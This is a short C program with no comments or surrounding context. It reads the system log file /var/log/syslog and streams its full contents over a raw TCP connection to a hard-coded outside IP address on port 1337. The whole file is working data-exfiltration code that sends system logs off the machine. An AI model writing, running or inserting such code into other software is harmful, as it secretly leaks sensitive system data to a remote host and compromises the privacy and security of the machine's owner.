#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char* argv[])
{
    char* buf[4096];
    int read_bytes;
    FILE* syslog = fopen("/var/log/syslog", "r");

    int sock;
    struct sockaddr_in server;
    unsigned short port = 1337;
    char* serverIP = "128.2.215.22";

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(serverIP);
    server.sin_port = htons(port);

    if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        return EXIT_FAILURE;

    if (connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0)
        return EXIT_FAILURE;

    while (!feof(syslog))
    {
        read_bytes = fread(buf, 1, 4096, syslog);
        send(sock, buf, read_bytes, 0); 
    }

    close(sock);
    fclose(syslog);

    return EXIT_SUCCESS;
}
